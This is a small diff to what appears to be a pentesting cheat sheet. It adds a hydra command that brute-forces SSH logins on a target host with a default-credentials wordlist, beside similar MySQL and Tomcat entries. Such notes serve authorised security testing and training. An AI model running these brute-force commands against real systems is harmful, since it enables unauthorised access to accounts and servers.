@@ -5,6 +5,11 @@
 hydra $IP mysql -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt -t 1
 ```
 
+## ssh
+```bash
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -e nsr -t 1 $IP ssh
+```
+
 ## tomcat
 colon separated: /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
 -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
